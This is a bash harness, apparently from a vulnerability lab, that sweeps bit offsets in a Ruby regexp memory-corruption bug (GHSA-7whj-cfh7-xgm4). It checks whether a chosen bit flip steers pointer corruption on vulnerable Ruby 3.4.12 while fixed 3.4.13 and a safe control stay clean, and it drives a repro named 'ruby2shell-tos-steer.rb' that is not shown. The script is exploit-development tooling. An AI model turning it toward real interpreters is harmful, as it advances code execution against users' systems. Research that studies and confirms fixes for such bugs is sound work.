#!/usr/bin/env bash
# GHSA-7whj-cfh7-xgm4 depth probe: the reparse one-bit OR targets a word at
# cc+8+4*(V/32). This sweep targets pointer-shaped words at known offsets
# after the live CClassNode (observed in dump-near-cc.out) and asks whether a
# chosen bit changes the Regexp#to_s result on plain 3.4.12. A result counts
# only if fixed 3.4.13 and the safe ASCII control stay clean.
set -u
ROOT=$(cd "$(dirname "$0")/../.." && pwd)
cd "$ROOT" || exit 2
EVID=lab/build/evidence/tos-steer/relptr
mkdir -p "$EVID"
RB=lab/repro/ruby2shell-tos-steer.rb
P12=lab/build/plain/ruby-3.4.12-plain/bin/ruby
P13=lab/build/plain/ruby-3.4.13-plain/bin/ruby
: >"$EVID/summary.txt"

run() { # label binary hex-code
  local label=$1 bin=$2 code=$3 out rc
  out="$EVID/$label-$code.out"
  timeout 10 "$bin" "$RB" "$code" >"$out" 2>&1
  rc=$?
  printf '%-8s V=%-8s rc=%-3s bytes=%s\n' "$label" "$code" "$rc" \
    "$(wc -c <"$out")" >>"$EVID/summary.txt"
  printf '%s' "$rc"
}

# (label, Vbase for a pointer qword at cc+off)
bases=(140 2c0 440 500 840 900 1080 1180 1240 1640 1840 1a00 2340 2580)
for base in "${bases[@]}"; do
  for bit in 4 5 6 7 8 9; do
    v=$(printf '%x' $((0x$base + bit)))
    a=$(run v12 "$P12" "$v")
    b=$(run v13 "$P13" "$v")
    echo "base=0x$base bit=$bit vulnerable_rc=$a fixed_rc=$b" | tee -a "$EVID/summary.txt"
  done
done
echo "safe control:" >>"$EVID/summary.txt"
run safe12 "$P12" 41
run safe13 "$P13" 41
echo "summary: $EVID/summary.txt"
